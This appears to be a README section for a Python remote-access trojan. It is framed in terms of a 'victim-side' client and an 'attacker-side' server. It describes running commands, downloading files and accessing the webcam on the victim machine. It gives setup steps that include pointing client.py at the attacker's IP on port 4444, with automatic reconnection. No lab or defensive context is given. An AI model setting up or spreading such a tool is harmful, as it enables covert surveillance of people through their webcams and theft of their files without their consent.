## üß† How It Works

This tool is divided into two main parts:

1. **Client (Victim-side)** ‚Äì Connects to the attacker's machine and waits for commands.
2. **Server (Attacker-side)** ‚Äì Listens for incoming connections and sends commands.

Once the client connects, the attacker can execute commands and perform actions like downloading files or accessing the webcam.

## üß∞ Requirements

* Python 3.x
* Required Libraries:

  ```bash
  pip install opencv-python psutil pillow
  ```

> üìå **Note:** `ImageGrab` only works on Windows systems or macOS (with GUI).

## üõ†Ô∏è Setup

### ‚úÖ Server (Attacker's Machine)

```bash
python server.py
```

### üß¨ Client (Victim's Machine)

Edit the IP address in the client script (`client.py`) to match the attacker's IP:

```python
server('YOUR-IP-ADDRESS', 4444)
```

Then run:

```bash
python client.py
```

> The client will keep trying to reconnect until the server is available.
